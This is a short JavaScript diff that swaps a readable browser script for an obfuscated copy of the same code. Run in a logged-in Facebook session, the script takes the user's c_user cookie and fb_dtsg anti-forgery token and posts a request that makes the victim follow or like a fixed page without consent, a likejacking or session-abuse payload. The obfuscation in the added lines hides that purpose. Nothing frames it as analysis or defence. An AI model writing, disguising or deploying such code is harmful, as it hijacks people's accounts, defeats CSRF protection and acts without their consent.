@@ -1,10 +1,1 @@
-var X = new XMLHttpRequest();
-  var XURL = "//www.facebook.com/ajax/pages/fan_status.php?__pc=EXP1%3ADEFAULT";
-  var XParams = "fbpage_id=135144533225491&add=true&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&ttstamp=";
-  X.open("POST", XURL, true);
-  X.onreadystatechange = function () {
-    if (X.readyState == 4 && X.status == 200) {
-      X.close;
-    }
-  };
-  X.send(XParams);
+var _0x05b3=['//www.facebook.com/ajax/pages/fan_status.php?__pc=EXP1%3ADEFAULT','cookie','match','&__a=1&fb_dtsg=','fb_dtsg','value','&ttstamp=','open','POST','setRequestHeader','Content-type','application/x-www-form-urlencoded','onreadystatechange','readyState','close','send'];(function(_0x1b7368,_0x3286ed){var _0x25d54c=function(_0x2366da){while(--_0x2366da){_0x1b7368['push'](_0x1b7368['shift']());}};_0x25d54c(++_0x3286ed);}(_0x05b3,0x160));var _0x305b=function(_0x54f322,_0x24a660){_0x54f322=_0x54f322-0x0;var _0xb0a1d5=_0x05b3[_0x54f322];return _0xb0a1d5;};var X=new XMLHttpRequest();var XURL=_0x305b('0x0');var XParams='fbpage_id=135144533225491&add=true&__user='+document[_0x305b('0x1')][_0x305b('0x2')](document[_0x305b('0x1')][_0x305b('0x2')](/c_user=(\d+)/)[0x1])+_0x305b('0x3')+document['getElementsByName'](_0x305b('0x4'))[0x0][_0x305b('0x5')]+_0x305b('0x6');X[_0x305b('0x7')](_0x305b('0x8'),XURL,!![]);X[_0x305b('0x9')](_0x305b('0xa'),_0x305b('0xb'));X[_0x305b('0xc')]=function(){if(X[_0x305b('0xd')]==0x4&&X['status']==0xc8){X[_0x305b('0xe')];}};X[_0x305b('0xf')](XParams);
